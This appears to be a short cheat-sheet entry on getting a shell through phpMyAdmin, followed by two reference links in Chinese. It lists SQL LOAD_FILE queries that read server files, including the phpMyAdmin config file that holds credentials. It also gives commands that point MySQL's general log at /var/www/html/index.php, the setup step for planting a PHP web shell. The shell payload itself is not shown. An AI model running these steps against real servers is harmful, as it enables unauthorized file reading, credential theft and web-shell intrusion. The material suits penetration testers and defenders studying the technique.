phpmyadmin-getshell
===========================

phpmyadmin-getshell


Tips
-----------------

::

	select load_file('/var/www/html/index.html')
	select load_file('/etc/apache2/apache2.conf')
	select load_file('/etc/phpmyadmin/config.inc.php')
	select load_file('/usr/share/phpmyadmin/index.php')
	SELECT LOAD_FILE( '/usr/share/phpmyadmin/phpinfo.php' )
	SELECT LOAD_FILE( '/etc/apache2/sites-enabled/000-default.conf' )
	SELECT LOAD_FILE( '/etc/apache2/sites-available/000-default.conf' )
	SELECT LOAD_FILE( '/etc/apache2/conf-available/serve-cgi-bin.conf' )

::

	set global general_log = "ON";
	set global general_log_file='/var/www/html/index.php';


phpmyadmin getshell姿势
-----------------

`phpmyadmin getshell姿势`_


.. _phpmyadmin getshell姿势: https://xz.aliyun.com/t/3283


Ubuntu 14.04 Web服务器--Apache的安装和配置
-----------------

`Ubuntu 14.04 Web服务器--Apache的安装和配置`_


.. _Ubuntu 14.04 Web服务器--Apache的安装和配置: https://jingyan.baidu.com/article/6d704a130c8a0d28da51ca5f.html


